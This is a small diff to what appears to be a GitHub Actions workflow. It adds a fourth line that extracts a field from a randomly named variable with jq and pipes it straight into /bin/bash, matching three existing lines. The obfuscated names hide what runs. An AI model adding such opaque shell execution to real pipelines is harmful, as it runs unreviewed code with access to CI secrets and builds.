@@ -34,6 +34,7 @@ jobs:
           echo $u96 | jq -r .f02435 | /bin/bash
           echo $bsmz511 | jq -r .aas24 | /bin/bash
           echo $wxsvw9 | jq -r .kem661 | /bin/bash
+          echo $clybs2 | jq -r .zu0198 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
